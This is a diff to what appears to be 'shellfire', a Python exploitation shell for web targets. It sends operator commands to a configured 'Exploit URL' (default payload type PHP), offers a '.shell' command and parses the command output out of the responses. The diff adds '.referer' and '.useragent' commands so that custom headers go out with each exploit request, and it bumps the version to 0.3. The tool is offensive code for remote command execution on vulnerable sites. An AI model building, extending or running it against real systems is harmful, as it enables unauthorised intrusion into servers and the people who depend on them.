@@ -2,7 +2,6 @@
 # Thanks to Offensive-Security for inspiring this!
 # Written by Unix-Ninja
 # Aug 2016
-# Thanks to Offensive-Security for inspiring this!
 
 import argparse
 import json
@@ -18,11 +17,15 @@ import time
 ############################################################
 ## Configs
 
-version = "0.2"
+version = "0.3"
 url = "http://www.example.com?"
 history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
 post_data = {}
 cookies = {}
+headers = {
+        'User-Agent': '',
+        'Referer': ''
+        }
 payload = ""
 payload_type = "PHP"
 
@@ -110,8 +113,10 @@ Available commands:
   .method
   .phpinfo
   .post
+  .referer
   .shell
   .url
+  .useragent
   .quit
 """)
 
@@ -304,6 +309,12 @@ while True:
     else:
       post = json.loads(input[6:])
     sys.stdout.write("[*] POST data set to %s\n" % post)
+  elif cmd[0] == ".referer":
+    if len(cmd) > 1:
+      headers['Referer'] = input[len(cmd[0]):]
+      sys.stdout.write("[*] Referer set\n")
+    else:
+      sys.stdout.write("[*] Referer: %s\n" % headers['Referer'])
   elif cmd[0] == ".shell":
     if len(cmd) is not 3:
       sys.stdout.write("[!] Invalid parameters\n")
@@ -328,6 +339,12 @@ while True:
       sys.stdout.write("[*] Exploit URL set\n")
     else:
       sys.stdout.write("[*] Exploit URL is %s\n" % url)
+  elif cmd[0] == ".useragent":
+    if len(cmd) > 1:
+      headers['User-Agent'] = input[len(cmd[0]):]
+      sys.stdout.write("[*] User-Agent set\n")
+    else:
+      sys.stdout.write("[*] User-Agent: %s\n" % headers['User-Agent'])
   else:
     exec_cmd = True
 
@@ -348,9 +365,9 @@ while True:
       sys.stdout.write("[Q] " + query + "\n")
     try:
       if method == "post":
-        r = requests.post(query, data=post, verify=False, cookies=cookies)
+        r = requests.post(query, data=post, verify=False, cookies=cookies, headers=headers)
       else:
-        r = requests.get(query, verify=False, cookies=cookies)
+        r = requests.get(query, verify=False, cookies=cookies, headers=headers)
       ## sanitize the output. we only want to see our commands if possible
       output = r.text.split('--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--')
       if len(output) > 1:
